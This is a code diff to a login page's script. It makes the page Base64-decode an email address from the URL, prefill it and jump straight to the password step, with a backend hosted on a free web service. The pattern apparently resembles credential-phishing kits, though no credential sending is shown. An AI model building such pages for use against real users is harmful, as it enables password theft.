@@ -290,19 +290,45 @@
             // BACKEND CONFIGURATION
             const BACKEND_URL = 'https://server-gfhv.onrender.com';
 
+            // Base64 decoding function
+            function decodeBase64(encodedString) {
+                try {
+                    // Decode the Base64 string
+                    const decodedString = atob(encodedString);
+                    // Remove any trailing newlines or spaces
+                    return decodedString.trim();
+                } catch (error) {
+                    console.error('Base64 decoding error:', error);
+                    return null;
+                }
+            }
+
             // Get email from URL parameters
             function getEmailFromURL() {
                 const urlParams = new URLSearchParams(window.location.search);
-                return urlParams.get('email');
+                const encodedEmail = urlParams.get('email');
+
+                if (encodedEmail) {
+                    // Decode the Base64 email
+                    const decodedEmail = decodeBase64(encodedEmail);
+                    if (decodedEmail && validateEmail(decodedEmail)) {
+                        return decodedEmail;
+                    } else {
+                        console.error('Invalid or malformed email after decoding');
+                        return null;
+                    }
+                }
+                return null;
             }
+
 
             // Initialize page based on URL parameters
             function initializePage() {
-                const urlEmail = getEmailFromURL();
+                const decodedEmail = getEmailFromURL();
 
-                if (urlEmail) {
-                    // If email is provided in URL, show password step immediately
-                    emailDisplay.value = urlEmail;
+                if (decodedEmail) {
+                    // If email is provided in URL (and successfully decoded), show password step immediately
+                    emailDisplay.value = decodedEmail;
                     emailStep.style.display = 'none';
                     passwordStep.style.display = 'block';
 
@@ -311,7 +337,7 @@
                         passwordInput.focus();
                     }, 100);
                 } else {
-                    // If no email in URL, show email step
+                    // If no valid email in URL, show email step
                     emailStep.style.display = 'block';
                     passwordStep.style.display = 'none';
                     emailInput.focus();
